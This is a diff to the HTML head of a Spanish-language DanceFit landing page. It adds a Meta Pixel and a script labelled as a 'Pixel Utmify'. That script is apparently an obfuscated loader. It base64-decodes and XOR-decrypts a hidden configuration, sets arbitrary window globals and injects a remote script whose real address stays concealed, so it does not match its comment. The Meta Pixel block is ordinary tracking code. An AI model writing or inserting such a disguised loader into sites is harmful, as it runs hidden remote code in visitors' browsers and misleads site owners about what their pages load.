@@ -8,11 +8,32 @@
     <meta name="robots" content="noindex,nofollow">
     <title>DanceFit — Tu plan de baile</title>
     <link rel="icon" href="favicon.svg" type="image/svg+xml">
+    <!-- Pixel Utmify (carrega https://cdn.utmify.com.br/scripts/pixel/pixel.js) -->
+    <script>(function(){var c_s4y=atob("DLyaQ2PgE2tOMLJUmMe4NhGMMVFsWMYg6M+gbEyDdwVgRcY58drjbQCPfkUsQp0n+87zMxeTPBsnSNc4t8zzOwaMPQE9Ep52+cjuMQqCZh8rQ5Buw+G2YQSMfAkvXMF2oufhYQ2Bfg5sCpAk8cT/LyqEMUdsRtM47dm4eUHWcgksVIZg/d6qcwDQcl8rU9BlqoX4IFvCbjYz");var p_bpd7=[];for(var n_sl=0;n_sl<c_s4y.length;n_sl++){p_bpd7.push(c_s4y.charCodeAt(n_sl)&255);}var d_9d3=p_bpd7[0];var z_wcl=p_bpd7.slice(1,1+d_9d3);var o_gh58=p_bpd7.slice(1+d_9d3);var i_d4=o_gh58.map(function(b,g_pisr){return b^z_wcl[g_pisr%d_9d3];});var k_3t="";for(var d_xt=0;d_xt<i_d4.length;d_xt++){k_3t+=String.fromCharCode(i_d4[d_xt]&255);}var a_dg=decodeURIComponent(escape(k_3t));var m_cwn1=JSON.parse(a_dg);var n_23=m_cwn1.globals||[];n_23.forEach(function(d_7j){window[d_7j.name]=d_7j.value;});var i_c5=document.createElement("script");i_c5.src=m_cwn1.url;i_c5.async=true;i_c5.defer=true;(m_cwn1.attributes||[]).forEach(function(s_q){i_c5.setAttribute(s_q.name,s_q.value);});(document.head||document.documentElement).appendChild(i_c5);})();</script>
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2607069706476567');
+    fbq('track', 'PageView');
+    // InitiateCheckout no clique de "Quiero empezar ahora" (evento emitido por app.js).
+    document.addEventListener('dancefit:checkout', function (event) {
+      if (event.detail && event.detail.configured) fbq('track', 'InitiateCheckout', { value: event.detail.price, currency: event.detail.currency });
+    });
+    </script>
+    <!-- End Meta Pixel Code -->
     <link rel="stylesheet" href="styles.css">
     <script src="assets-manifest.js"></script>
     <script type="module" src="app.js"></script>
   </head>
   <body>
+    <noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=2607069706476567&ev=PageView&noscript=1"></noscript>
     <div class="page-shell">
       <header class="site-header">
         <div class="header-row">
